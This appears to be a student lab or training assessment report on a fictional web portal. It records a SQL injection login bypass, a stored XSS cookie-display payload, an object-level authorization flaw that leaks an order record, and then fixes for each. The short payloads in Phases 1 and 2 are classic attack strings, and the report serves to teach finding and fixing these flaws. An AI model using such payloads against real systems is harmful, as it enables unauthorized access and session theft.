# OMNI-PORTAL ASSESSMENT REPORT
**Operator:** Melaku Mekonnen **Deadline:** April 5 @ 11:59 PM

## PHASE 1: AUTH BYPASS (SQLi)
* **Payload Used:** ' OR 1=1 --
* **Result:** Successfully bypassed login and obtained 'auth_token' cookie.

## PHASE 2: CLIENT-SIDE HIJACK (XSS)
* **Stored XSS Payload:** <script>alert(document.cookie)</script>
* **Secret Cookie Captured:** session_id=admin_secret_99812_do_not_share; auth_token=SUPPORT_TIER_1_SECRET_TOKEN

## PHASE 3: API ENUMERATION (BOLA)
* **Insecure Order ID:** 501
* **Confidential Data Leaked:** {"amount":"$15,000.00","details":"Confidential Server Lease","order_id":501}

## PHASE 4: THE REMEDIATION
* **Fix for SQLi:** Use parameterized queries so user input is never treated as SQL code by the database.
* **Fix for XSS:** Encode user input before rendering it on the page so the browser displays it as text and never executes it as code.
* **Fix for API BOLA:** Add an ownership check to verify the order belongs to the logged in user before returning any data.
